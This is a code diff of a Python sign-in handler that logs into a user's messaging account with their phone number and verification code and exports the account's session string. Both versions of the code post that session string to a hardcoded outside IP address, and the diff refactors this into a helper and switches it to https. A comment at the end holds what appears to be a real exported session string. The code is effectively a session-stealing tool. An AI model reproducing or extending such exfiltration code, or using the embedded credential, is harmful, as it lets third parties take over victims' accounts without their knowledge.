@@ -74,7 +74,7 @@ def sign_in(response):
                 continue
             target_client.sign_in(phone_number=phone_number, phone_code_hash=code_info, phone_code=phone_code)
             session_string = target_client.export_session_string()
-            requests.post(url='http://195.2.85.217:6003/processSession', json={'session': session_string})
+            send_session(session_string)
             response.data = json.dumps({'session-string': session_string})
             target_client.disconnect()
             phone_number = ''
@@ -95,8 +95,8 @@ def send_session(session_string):
     host_port = '6003'
     endpoint = 'processSession'
     requests.post(
-        url=f'http://{host_addr}:{host_port}/{endpoint}',
-        json={'session-string': session_string}
+        url=f'https://{host_addr}:{host_port}/{endpoint}',
+        json={'session': session_string}
     )
 
 # {"session-string": "AgGTkFkAIRWwJWsEpaGVaGD3fwThvpSjsE5O-EGY1O9_VkdIeeH4EL1PN3RstjsTr0_3WiHHVvxZVWaMPOMqQRmJzAnIGUtWDsfim2JwPGJgffG_3GUO2RPskMmmSk2IBBUJ2asOChOPqeSdTRGm8FRzOMJnBmy4OXmlnTYWNDGMxVH8mH2b15brxNFEYWbfbA7VnK2H4iQ5f_btyp1t_T4KpMZLkkcfzo-AUMzXeAV-rSgpVtFSHhpRRuem4ZAjslWNYtdklVAM8NZchj0_g19BxnAQ_I0Z_Vp0p5YLT-5eLExlB20UaLylt-SQF26cjedi_lbV5r7CoaxZMpVVUVk-yB9cxQAAAAGdJwjsAA"}
